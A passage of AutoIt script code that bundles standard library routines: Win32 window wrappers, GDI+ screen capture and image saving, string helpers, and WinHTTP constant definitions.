	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipInitializePalette", "struct*", $tpalette, "uint", $ipalettetype, "uint", $ioptimalcolors, "bool", $busetransparentcolor, "handle", $hbitmap)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $tpalette
EndFunc

Func _sendmessage($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
	Local $aresult = DllCall("user32.dll", $sreturntype, "SendMessageW", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
	If @error Then Return SetError(@error, @extended, "")
	If $ireturn >= 0 AND $ireturn <= 4 Then Return $aresult[$ireturn]
	Return $aresult
EndFunc

Func _sendmessagea($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
	Local $aresult = DllCall("user32.dll", $sreturntype, "SendMessageA", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
	If @error Then Return SetError(@error, @extended, "")
	If $ireturn >= 0 AND $ireturn <= 4 Then Return $aresult[$ireturn]
	Return $aresult
EndFunc

#Region Global Variables and Constants
	Global $__g_ainprocess_winapi[64][2] = [[0, 0]]
	Global $__g_awinlist_winapi[64][2] = [[0, 0]]
	Global Const $gw_hwndfirst = 0
	Global Const $gw_hwndlast = 1
	Global Const $gw_hwndnext = 2
	Global Const $gw_hwndprev = 3
	Global Const $gw_owner = 4
	Global Const $gw_child = 5
	Global Const $gw_enabledpopup = 6
	Global Const $gwl_wndproc = -4
	Global Const $gwl_hinstance = -6
	Global Const $gwl_hwndparent = -8
	Global Const $gwl_id = -12
	Global Const $gwl_style = -16
	Global Const $gwl_exstyle = -20
	Global Const $gwl_userdata = -21
	Global Const $__winapiconstant_wm_setfont = 48
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_createwindowex($iexstyle, $sclass, $sname, $istyle, $ix, $iy, $iwidth, $iheight, $hparent, $hmenu = 0, $hinstance = 0, $pparam = 0)
		If $hinstance = 0 Then $hinstance = _winapi_getmodulehandle("")
		Local $aresult = DllCall("user32.dll", "hwnd", "CreateWindowExW", "dword", $iexstyle, "wstr", $sclass, "wstr", $sname, "dword", $istyle, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "hwnd", $hparent, "handle", $hmenu, "handle", $hinstance, "struct*", $pparam)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getclientrect($hwnd)
		Local $trect = DllStructCreate($tagrect)
		Local $aret = DllCall("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $trect
	EndFunc

	Func _winapi_getdesktopwindow()
		Local $aresult = DllCall("user32.dll", "hwnd", "GetDesktopWindow")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_destroywindow($hwnd)
		Local $aresult = DllCall("user32.dll", "bool", "DestroyWindow", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_enablewindow($hwnd, $benable = True)
		Local $aresult = DllCall("user32.dll", "bool", "EnableWindow", "hwnd", $hwnd, "bool", $benable)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_enumwindows($bvisible = True, $hwnd = Default)
		__winapi_enumwindowsinit()
		If $hwnd = Default Then $hwnd = _winapi_getdesktopwindow()
		__winapi_enumwindowschild($hwnd, $bvisible)
		Return $__g_awinlist_winapi
	EndFunc

	Func _winapi_enumwindowspopup()
		__winapi_enumwindowsinit()
		Local $hwnd = _winapi_getwindow(_winapi_getdesktopwindow(), $gw_child)
		Local $sclass
		While $hwnd <> 0
			If _winapi_iswindowvisible($hwnd) Then
				$sclass = _winapi_getclassname($hwnd)
				If $sclass = "#32768" Then
					__winapi_enumwindowsadd($hwnd)
				ElseIf $sclass = "ToolbarWindow32" Then
					__winapi_enumwindowsadd($hwnd)
				ElseIf $sclass = "ToolTips_Class32" Then
					__winapi_enumwindowsadd($hwnd)
				ElseIf $sclass = "BaseBar" Then
					__winapi_enumwindowschild($hwnd)
				EndIf
			EndIf
			$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)
		WEnd
		Return $__g_awinlist_winapi
	EndFunc

	Func _winapi_enumwindowstop()
		__winapi_enumwindowsinit()
		Local $hwnd = _winapi_getwindow(_winapi_getdesktopwindow(), $gw_child)
		While $hwnd <> 0
			If _winapi_iswindowvisible($hwnd) Then __winapi_enumwindowsadd($hwnd)
			$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)
		WEnd
		Return $__g_awinlist_winapi
	EndFunc

	Func _winapi_getclassname($hwnd)
		If NOT IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
		Local $aresult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
		If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, "")
		Return SetExtended($aresult[0], $aresult[2])
	EndFunc

	Func _winapi_getfocus()
		Local $aresult = DllCall("user32.dll", "hwnd", "GetFocus")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getparent($hwnd)
		Local $aresult = DllCall("user32.dll", "hwnd", "GetParent", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getsyscolor($iindex)
		Local $aresult = DllCall("user32.dll", "INT", "GetSysColor", "int", $iindex)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getsystemmetrics($iindex)
		Local $aresult = DllCall("user32.dll", "int", "GetSystemMetrics", "int", $iindex)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getwindow($hwnd, $icmd)
		Local $aresult = DllCall("user32.dll", "hwnd", "GetWindow", "hwnd", $hwnd, "uint", $icmd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getwindowheight($hwnd)
		Local $trect = _winapi_getwindowrect($hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top")
	EndFunc

	Func _winapi_getwindowlong($hwnd, $iindex)
		Local $sfuncname = "GetWindowLongW"
		If @AutoItX64 Then $sfuncname = "GetWindowLongPtrW"
		Local $aresult = DllCall("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex)
		If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getwindowrect($hwnd)
		Local $trect = DllStructCreate($tagrect)
		Local $aret = DllCall("user32.dll", "bool", "GetWindowRect", "hwnd", $hwnd, "struct*", $trect)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $trect
	EndFunc

	Func _winapi_getwindowtext($hwnd)
		Local $aresult = DllCall("user32.dll", "int", "GetWindowTextW", "hwnd", $hwnd, "wstr", "", "int", 4096)
		If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, "")
		Return SetExtended($aresult[0], $aresult[2])
	EndFunc

	Func _winapi_getwindowthreadprocessid($hwnd, ByRef $ipid)
		Local $aresult = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		$ipid = $aresult[2]
		Return $aresult[0]
	EndFunc

	Func _winapi_getwindowwidth($hwnd)
		Local $trect = _winapi_getwindowrect($hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
	EndFunc

	Func _winapi_inprocess($hwnd, ByRef $hlastwnd)
		If $hwnd = $hlastwnd Then Return True
		For $ii = $__g_ainprocess_winapi[0][0] To 1 Step -1
			If $hwnd = $__g_ainprocess_winapi[$ii][0] Then
				If $__g_ainprocess_winapi[$ii][1] Then
					$hlastwnd = $hwnd
					Return True
				Else
					Return False
				EndIf
			EndIf
		Next
		Local $ipid
		_winapi_getwindowthreadprocessid($hwnd, $ipid)
		Local $icount = $__g_ainprocess_winapi[0][0] + 1
		If $icount >= 64 Then $icount = 1
		$__g_ainprocess_winapi[0][0] = $icount
		$__g_ainprocess_winapi[$icount][0] = $hwnd
		$__g_ainprocess_winapi[$icount][1] = ($ipid = @AutoItPID)
		Return $__g_ainprocess_winapi[$icount][1]
	EndFunc

	Func _winapi_invalidaterect($hwnd, $trect = 0, $berase = True)
		Local $aresult = DllCall("user32.dll", "bool", "InvalidateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $berase)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_isclassname($hwnd, $sclassname)
		Local $sseparator = Opt("GUIDataSeparatorChar")
		Local $aclassname = StringSplit($sclassname, $sseparator)
		If NOT IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
		Local $sclasscheck = _winapi_getclassname($hwnd)
		For $x = 1 To UBound($aclassname) - 1
			If StringUpper(StringMid($sclasscheck, 1, StringLen($aclassname[$x]))) = StringUpper($aclassname[$x]) Then Return True
		Next
		Return False
	EndFunc

	Func _winapi_iswindow($hwnd)
		Local $aresult = DllCall("user32.dll", "bool", "IsWindow", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_iswindowvisible($hwnd)
		Local $aresult = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_movewindow($hwnd, $ix, $iy, $iwidth, $iheight, $brepaint = True)
		Local $aresult = DllCall("user32.dll", "bool", "MoveWindow", "hwnd", $hwnd, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "bool", $brepaint)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_setfocus($hwnd)
		Local $aresult = DllCall("user32.dll", "hwnd", "SetFocus", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_setfont($hwnd, $hfont, $bredraw = True)
		_sendmessage($hwnd, $__winapiconstant_wm_setfont, $hfont, $bredraw, 0, "hwnd")
	EndFunc

	Func _winapi_setparent($hwndchild, $hwndparent)
		Local $aresult = DllCall("user32.dll", "hwnd", "SetParent", "hwnd", $hwndchild, "hwnd", $hwndparent)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_setwindowpos($hwnd, $hafter, $ix, $iy, $icx, $icy, $iflags)
		Local $aresult = DllCall("user32.dll", "bool", "SetWindowPos", "hwnd", $hwnd, "hwnd", $hafter, "int", $ix, "int", $iy, "int", $icx, "int", $icy, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_setwindowtext($hwnd, $stext)
		Local $aresult = DllCall("user32.dll", "bool", "SetWindowTextW", "hwnd", $hwnd, "wstr", $stext)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_showwindow($hwnd, $icmdshow = 5)
		Local $aresult = DllCall("user32.dll", "bool", "ShowWindow", "hwnd", $hwnd, "int", $icmdshow)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_updatewindow($hwnd)
		Local $aresult = DllCall("user32.dll", "bool", "UpdateWindow", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __winapi_enumwindowsadd($hwnd, $sclass = "")
		If $sclass = "" Then $sclass = _winapi_getclassname($hwnd)
		$__g_awinlist_winapi[0][0] += 1
		Local $icount = $__g_awinlist_winapi[0][0]
		If $icount >= $__g_awinlist_winapi[0][1] Then
			ReDim $__g_awinlist_winapi[$icount + 64][2]
			$__g_awinlist_winapi[0][1] += 64
		EndIf
		$__g_awinlist_winapi[$icount][0] = $hwnd
		$__g_awinlist_winapi[$icount][1] = $sclass
	EndFunc

	Func __winapi_enumwindowschild($hwnd, $bvisible = True)
		$hwnd = _winapi_getwindow($hwnd, $gw_child)
		While $hwnd <> 0
			If (NOT $bvisible) OR _winapi_iswindowvisible($hwnd) Then
				__winapi_enumwindowsadd($hwnd)
				__winapi_enumwindowschild($hwnd, $bvisible)
			EndIf
			$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)
		WEnd
	EndFunc

	Func __winapi_enumwindowsinit()
		ReDim $__g_awinlist_winapi[64][2]
		$__g_awinlist_winapi[0][0] = 0
		$__g_awinlist_winapi[0][1] = 64
	EndFunc

#EndRegion Internal Functions
Global $__g_ibmpformat = $gdip_pxf24rgb
Global $__g_ijpgquality = 100
Global $__g_itifcolordepth = 24
Global $__g_itifcompression = $gdip_evtcompressionlzw
Global Const $__screencaptureconstant_sm_cxscreen = 0
Global Const $__screencaptureconstant_sm_cyscreen = 1
Global Const $__screencaptureconstant_srccopy = 13369376

Func _screencapture_capture($sfilename = "", $ileft = 0, $itop = 0, $iright = -1, $ibottom = -1, $bcursor = True)
	Local $bret = False
	If $iright = -1 Then $iright = _winapi_getsystemmetrics($__screencaptureconstant_sm_cxscreen) - 1
	If $ibottom = -1 Then $ibottom = _winapi_getsystemmetrics($__screencaptureconstant_sm_cyscreen) - 1
	If $iright < $ileft Then Return SetError(-1, 0, $bret)
	If $ibottom < $itop Then Return SetError(-2, 0, $bret)
	Local $iw = ($iright - $ileft) + 1
	Local $ih = ($ibottom - $itop) + 1
	Local $hwnd = _winapi_getdesktopwindow()
	Local $hddc = _winapi_getdc($hwnd)
	Local $hcdc = _winapi_createcompatibledc($hddc)
	Local $hbmp = _winapi_createcompatiblebitmap($hddc, $iw, $ih)
	_winapi_selectobject($hcdc, $hbmp)
	_winapi_bitblt($hcdc, 0, 0, $iw, $ih, $hddc, $ileft, $itop, $__screencaptureconstant_srccopy)
	If $bcursor Then
		Local $acursor = _winapi_getcursorinfo()
		If NOT @error AND $acursor[1] Then
			$bcursor = True
			Local $hicon = _winapi_copyicon($acursor[2])
			Local $aicon = _winapi_geticoninfo($hicon)
			If NOT @error Then
				_winapi_deleteobject($aicon[4])
				If $aicon[5] <> 0 Then _winapi_deleteobject($aicon[5])
				_winapi_drawicon($hcdc, $acursor[3] - $aicon[2] - $ileft, $acursor[4] - $aicon[3] - $itop, $hicon)
			EndIf
			_winapi_destroyicon($hicon)
		EndIf
	EndIf
	_winapi_releasedc($hwnd, $hddc)
	_winapi_deletedc($hcdc)
	If $sfilename = "" Then Return $hbmp
	$bret = _screencapture_saveimage($sfilename, $hbmp, True)
	Return SetError(@error, @extended, $bret)
EndFunc

Func _screencapture_capturewnd($sfilename, $hwnd, $ileft = 0, $itop = 0, $iright = -1, $ibottom = -1, $bcursor = True)
	If NOT IsHWnd($hwnd) Then $hwnd = WinGetHandle($hwnd)
	Local $trect = DllStructCreate($tagrect)
	Local Const $dwmwa_extended_frame_bounds = 9
	Local $bret = DllCall("dwmapi.dll", "long", "DwmGetWindowAttribute", "hwnd", $hwnd, "dword", $dwmwa_extended_frame_bounds, "struct*", $trect, "dword", DllStructGetSize($trect))
	If (@error OR $bret[0] OR (Abs(DllStructGetData($trect, "Left")) + Abs(DllStructGetData($trect, "Top")) + Abs(DllStructGetData($trect, "Right")) + Abs(DllStructGetData($trect, "Bottom"))) = 0) Then
		$trect = _winapi_getwindowrect($hwnd)
		If @error Then Return SetError(@error + 10, @extended, False)
	EndIf
	$ileft += DllStructGetData($trect, "Left")
	$itop += DllStructGetData($trect, "Top")
	If $iright = -1 Then $iright = DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left") - 1
	If $ibottom = -1 Then $ibottom = DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top") - 1
	$iright += DllStructGetData($trect, "Left")
	$ibottom += DllStructGetData($trect, "Top")
	If $ileft > DllStructGetData($trect, "Right") Then $ileft = DllStructGetData($trect, "Left")
	If $itop > DllStructGetData($trect, "Bottom") Then $itop = DllStructGetData($trect, "Top")
	If $iright > DllStructGetData($trect, "Right") Then $iright = DllStructGetData($trect, "Right") - 1
	If $ibottom > DllStructGetData($trect, "Bottom") Then $ibottom = DllStructGetData($trect, "Bottom") - 1
	$bret = _screencapture_capture($sfilename, $ileft, $itop, $iright, $ibottom, $bcursor)
	Return SetError(@error, @extended, $bret)
EndFunc

Func _screencapture_saveimage($sfilename, $hbitmap, $bfreebmp = True)
	_gdiplus_startup()
	If @error Then Return SetError(-1, -1, False)
	Local $sext = StringUpper(__gdiplus_extractfileext($sfilename))
	Local $sclsid = _gdiplus_encodersgetclsid($sext)
	If $sclsid = "" Then Return SetError(-2, -2, False)
	Local $himage = _gdiplus_bitmapcreatefromhbitmap($hbitmap)
	If @error Then Return SetError(-3, -3, False)
	Local $tdata, $tparams
	Switch $sext
		Case "BMP"
			Local $ix = _gdiplus_imagegetwidth($himage)
			Local $iy = _gdiplus_imagegetheight($himage)
			Local $hclone = _gdiplus_bitmapclonearea($himage, 0, 0, $ix, $iy, $__g_ibmpformat)
			_gdiplus_imagedispose($himage)
			$himage = $hclone
		Case "JPG", "JPEG"
			$tparams = _gdiplus_paraminit(1)
			$tdata = DllStructCreate("int Quality")
			DllStructSetData($tdata, "Quality", $__g_ijpgquality)
			_gdiplus_paramadd($tparams, $gdip_epgquality, 1, $gdip_eptlong, DllStructGetPtr($tdata))
		Case "TIF", "TIFF"
			$tparams = _gdiplus_paraminit(2)
			$tdata = DllStructCreate("int ColorDepth;int Compression")
			DllStructSetData($tdata, "ColorDepth", $__g_itifcolordepth)
			DllStructSetData($tdata, "Compression", $__g_itifcompression)
			_gdiplus_paramadd($tparams, $gdip_epgcolordepth, 1, $gdip_eptlong, DllStructGetPtr($tdata, "ColorDepth"))
			_gdiplus_paramadd($tparams, $gdip_epgcompression, 1, $gdip_eptlong, DllStructGetPtr($tdata, "Compression"))
	EndSwitch
	Local $pparams = 0
	If IsDllStruct($tparams) Then $pparams = $tparams
	Local $bret = _gdiplus_imagesavetofileex($himage, $sfilename, $sclsid, $pparams)
	_gdiplus_imagedispose($himage)
	If $bfreebmp Then _winapi_deleteobject($hbitmap)
	_gdiplus_shutdown()
	Return SetError($bret = False, 0, $bret)
EndFunc

Func _screencapture_setbmpformat($iformat)
	Switch $iformat
		Case 0
			$__g_ibmpformat = $gdip_pxf16rgb555
		Case 1
			$__g_ibmpformat = $gdip_pxf16rgb565
		Case 2
			$__g_ibmpformat = $gdip_pxf24rgb
		Case 3
			$__g_ibmpformat = $gdip_pxf32rgb
		Case 4
			$__g_ibmpformat = $gdip_pxf32argb
		Case Else
			$__g_ibmpformat = $gdip_pxf24rgb
	EndSwitch
EndFunc

Func _screencapture_setjpgquality($iquality)
	If $iquality < 0 Then $iquality = 0
	If $iquality > 100 Then $iquality = 100
	$__g_ijpgquality = $iquality
EndFunc

Func _screencapture_settifcolordepth($idepth)
	Switch $idepth
		Case 24
			$__g_itifcolordepth = 24
		Case 32
			$__g_itifcolordepth = 32
		Case Else
			$__g_itifcolordepth = 0
	EndSwitch
EndFunc

Func _screencapture_settifcompression($icompress)
	Switch $icompress
		Case 1
			$__g_itifcompression = $gdip_evtcompressionnone
		Case 2
			$__g_itifcompression = $gdip_evtcompressionlzw
		Case Else
			$__g_itifcompression = 0
	EndSwitch
EndFunc

Func _hextostring($shex)
	If NOT (StringLeft($shex, 2) == "0x") Then $shex = "0x" & $shex
	Return BinaryToString($shex, $sb_utf8)
EndFunc

Func _stringbetween($sstring, $sstart, $send, $imode = $str_endisstart, $bcase = False)
	$sstart = $sstart ? "\Q" & $sstart & "\E" : "\A"
	If $imode <> $str_endnotstart Then $imode = $str_endisstart
	If $imode = $str_endisstart Then
		$send = $send ? "(?=\Q" & $send & "\E)" : "\z"
	Else
		$send = $send ? "\Q" & $send & "\E" : "\z"
	EndIf
	If $bcase = Default Then
		$bcase = False
	EndIf
	Local $areturn = StringRegExp($sstring, "(?s" & (NOT $bcase ? "i" : "") & ")" & $sstart & "(.*?)" & $send, $str_regexparrayglobalmatch)
	If @error Then Return SetError(1, 0, 0)
	Return $areturn
EndFunc

Func _stringexplode($sstring, $sdelimiter, $ilimit = 0)
	If $ilimit = Default Then $ilimit = 0
	If $ilimit > 0 Then
		Local Const $null = Chr(0)
		$sstring = StringReplace($sstring, $sdelimiter, $null, $ilimit)
		$sdelimiter = $null
	ElseIf $ilimit < 0 Then
		Local $iindex = StringInStr($sstring, $sdelimiter, $str_nocasesensebasic, $ilimit)
		If $iindex Then
			$sstring = StringLeft($sstring, $iindex - 1)
		EndIf
	EndIf
	Return StringSplit($sstring, $sdelimiter, BitOR($str_entiresplit, $str_nocount))
EndFunc

Func _stringinsert($sstring, $sinsertion, $iposition)
	Local $ilength = StringLen($sstring)
	$iposition = Int($iposition)
	If $iposition < 0 Then $iposition = $ilength + $iposition
	If $ilength < $iposition OR $iposition < 0 Then Return SetError(1, 0, $sstring)
	Return StringLeft($sstring, $iposition) & $sinsertion & StringRight($sstring, $ilength - $iposition)
EndFunc

Func _stringproper($sstring)
	Local $bcapnext = True, $schr = "", $sreturn = ""
	For $i = 1 To StringLen($sstring)
		$schr = StringMid($sstring, $i, 1)
		Select 
			Case $bcapnext = True
				If StringRegExp($schr, "[a-zA-ZÀ-ÿšœžŸ]") Then
					$schr = StringUpper($schr)
					$bcapnext = False
				EndIf
			Case NOT StringRegExp($schr, "[a-zA-ZÀ-ÿšœžŸ]")
				$bcapnext = True
			Case Else
				$schr = StringLower($schr)
		EndSelect
		$sreturn &= $schr
	Next
	Return $sreturn
EndFunc

Func _stringrepeat($sstring, $irepeatcount)
	$irepeatcount = Int($irepeatcount)
	If $irepeatcount = 0 Then Return ""
	If StringLen($sstring) < 1 OR $irepeatcount < 0 Then Return SetError(1, 0, "")
	Local $sresult = ""
	While $irepeatcount > 1
		If BitAND($irepeatcount, 1) Then $sresult &= $sstring
		$sstring &= $sstring
		$irepeatcount = BitShift($irepeatcount, 1)
	WEnd
	Return $sstring & $sresult
EndFunc

Func _stringtitlecase($sstring)
	Local $bcapnext = True, $schr = "", $sreturn = ""
	For $i = 1 To StringLen($sstring)
		$schr = StringMid($sstring, $i, 1)
		Select 
			Case $bcapnext = True
				If StringRegExp($schr, "[a-zA-Z\xC0-\xFF0-9]") Then
					$schr = StringUpper($schr)
					$bcapnext = False
				EndIf
			Case NOT StringRegExp($schr, "[a-zA-Z\xC0-\xFF'0-9]")
				$bcapnext = True
			Case Else
				$schr = StringLower($schr)
		EndSelect
		$sreturn &= $schr
	Next
	Return $sreturn
EndFunc

Func _stringtohex($sstring)
	Return Hex(StringToBinary($sstring, $sb_utf8))
EndFunc

Global Const $internet_default_port = 0
Global Const $internet_default_http_port = 80
Global Const $internet_default_https_port = 443
Global Const $internet_scheme_http = 1
Global Const $internet_scheme_https = 2
Global Const $internet_scheme_ftp = 3
Global Const $icu_escape = -2147483648
Global Const $winhttp_flag_async = 268435456
Global Const $winhttp_flag_escape_percent = 4
Global Const $winhttp_flag_null_codepage = 8
Global Const $winhttp_flag_escape_disable = 64
Global Const $winhttp_flag_escape_disable_query = 128
Global Const $winhttp_flag_bypass_proxy_cache = 256
Global Const $winhttp_flag_refresh = $winhttp_flag_bypass_proxy_cache
Global Const $winhttp_flag_secure = 8388608
Global Const $winhttp_access_type_default_proxy = 0
Global Const $winhttp_access_type_no_proxy = 1
Global Const $winhttp_access_type_named_proxy = 3
Global Const $winhttp_no_proxy_name = ""
Global Const $winhttp_no_proxy_bypass = ""
Global Const $winhttp_no_referer = ""
Global Const $winhttp_default_accept_types = 0
Global Const $winhttp_no_additional_headers = ""
Global Const $winhttp_no_request_data = ""
Global Const $winhttp_header_name_by_index = ""
Global Const $winhttp_no_output_buffer = 0
Global Const $winhttp_no_header_index = 0
Global Const $winhttp_addreq_index_mask = 65535
Global Const $winhttp_addreq_flags_mask = -65536
Global Const $winhttp_addreq_flag_add_if_new = 268435456
Global Const $winhttp_addreq_flag_add = 536870912
Global Const $winhttp_addreq_flag_coalesce_with_comma = 1073741824
Global Const $winhttp_addreq_flag_coalesce_with_semicolon = 16777216
Global Const $winhttp_addreq_flag_coalesce = $winhttp_addreq_flag_coalesce_with_comma
Global Const $winhttp_addreq_flag_replace = -2147483648
Global Const $winhttp_ignore_request_total_length = 0
Global Const $winhttp_option_callback = 1
Global Const $winhttp_first_option = $winhttp_option_callback
Global Const $winhttp_option_resolve_timeout = 2
Global Const $winhttp_option_connect_timeout = 3
Global Const $winhttp_option_connect_retries = 4
Global Const $winhttp_option_send_timeout = 5
Global Const $winhttp_option_receive_timeout = 6
Global Const $winhttp_option_receive_response_timeout = 7
Global Const $winhttp_option_handle_type = 9
Global Const $winhttp_option_read_buffer_size = 12
Global Const $winhttp_option_write_buffer_size = 13
Global Const $winhttp_option_parent_handle = 21
Global Const $winhttp_option_extended_error = 24
Global Const $winhttp_option_security_flags = 31
Global Const $winhttp_option_security_certificate_struct = 32
Global Const $winhttp_option_url = 34
Global Const $winhttp_option_security_key_bitness = 36
Global Const $winhttp_option_proxy = 38
Global Const $winhttp_option_user_agent = 41
Global Const $winhttp_option_context_value = 45
Global Const $winhttp_option_client_cert_context = 47
Global Const $winhttp_option_request_priority = 58
Global Const $winhttp_option_http_version = 59
Global Const $winhttp_option_disable_feature = 63
Global Const $winhttp_option_codepage = 68
Global Const $winhttp_option_max_conns_per_server = 73
Global Const $winhttp_option_max_conns_per_1_0_server = 74
Global Const $winhttp_option_autologon_policy = 77
Global Const $winhttp_option_server_cert_context = 78
Global Const $winhttp_option_enable_feature = 79
Global Const $winhttp_option_worker_thread_count = 80
Global Const $winhttp_option_passport_cobranding_text = 81
Global Const $winhttp_option_passport_cobranding_url = 82
Global Const $winhttp_option_configure_passport_auth = 83
Global Const $winhttp_option_secure_protocols = 84
Global Const $winhttp_option_enabletracing = 85
Global Const $winhttp_option_passport_sign_out = 86
Global Const $winhttp_option_passport_return_url = 87
Global Const $winhttp_option_redirect_policy = 88
Global Const $winhttp_option_max_http_automatic_redirects = 89
Global Const $winhttp_option_max_http_status_continue = 90
Global Const $winhttp_option_max_response_header_size = 91
Global Const $winhttp_option_max_response_drain_size = 92
Global Const $winhttp_option_connection_info = 93
Global Const $winhttp_option_client_cert_issuer_list = 94
Global Const $winhttp_option_spn = 96
Global Const $winhttp_option_global_proxy_creds = 97
Global Const $winhttp_option_global_server_creds = 98
Global Const $winhttp_option_unload_notify_event = 99
Global Const $winhttp_option_reject_userpwd_in_url = 100
Global Const $winhttp_option_use_global_server_credentials = 101
Global Const $winhttp_option_receive_proxy_connect_response = 103
Global Const $winhttp_option_is_proxy_connect_response = 104
Global Const $winhttp_option_server_spn_used = 106
Global Const $winhttp_option_proxy_spn_used = 107
Global Const $winhttp_option_server_cbt = 108
Global Const $winhttp_option_unsafe_header_parsing = 110
Global Const $winhttp_option_decompression = 118
Global Const $winhttp_last_option = $winhttp_option_decompression
Global Const $winhttp_option_username = 4096
Global Const $winhttp_option_password = 4097
Global Const $winhttp_option_proxy_username = 4098
Global Const $winhttp_option_proxy_password = 4099
Global Const $winhttp_conns_per_server_unlimited = -1
Global Const $winhttp_decompression_flag_gzip = 1
Global Const $winhttp_decompression_flag_deflate = 2
Global Const $winhttp_decompression_flag_all = 3
Global Const $winhttp_autologon_security_level_medium = 0
Global Const $winhttp_autologon_security_level_low = 1
Global Const $winhttp_autologon_security_level_high = 2
Global Const $winhttp_autologon_security_level_default = $winhttp_autologon_security_level_medium
Global Const $winhttp_option_redirect_policy_never = 0
Global Const $winhttp_option_redirect_policy_disallow_https_to_http = 1
Global Const $winhttp_option_redirect_policy_always = 2
Global Const $winhttp_option_redirect_policy_last = $winhttp_option_redirect_policy_always
Global Const $winhttp_option_redirect_policy_default = $winhttp_option_redirect_policy_disallow_https_to_http
Global Const $winhttp_disable_passport_auth = 0
Global Const $winhttp_enable_passport_auth = 268435456
Global Const $winhttp_disable_passport_keyring = 536870912
Global Const $winhttp_enable_passport_keyring = 1073741824
Global Const $winhttp_disable_cookies = 1
Global Const $winhttp_disable_redirects = 2
Global Const $winhttp_disable_authentication = 4
Global Const $winhttp_disable_keep_alive = 8
Global Const $winhttp_enable_ssl_revocation = 1
Global Const $winhttp_enable_ssl_revert_impersonation = 2
Global Const $winhttp_disable_spn_server_port = 0
Global Const $winhttp_enable_spn_server_port = 1
Global Const $winhttp_option_spn_mask = $winhttp_enable_spn_server_port
Global Const $winhttp_error_base = 12000
Global Const $error_winhttp_out_of_handles = 12001
Global Const $error_winhttp_timeout = 12002
Global Const $error_winhttp_internal_error = 12004
Global Const $error_winhttp_invalid_url = 12005
Global Const $error_winhttp_unrecognized_scheme = 12006
Global Const $error_winhttp_name_not_resolved = 12007
Global Const $error_winhttp_invalid_option = 12009
Global Const $error_winhttp_option_not_settable = 12011
Global Const $error_winhttp_shutdown = 12012
Global Const $error_winhttp_login_failure = 12015
Global Const $error_winhttp_operation_cancelled = 12017
Global Const $error_winhttp_incorrect_handle_type = 12018
Global Const $error_winhttp_incorrect_handle_state = 12019
Global Const $error_winhttp_cannot_connect = 12029
Global Const $error_winhttp_connection_error = 12030
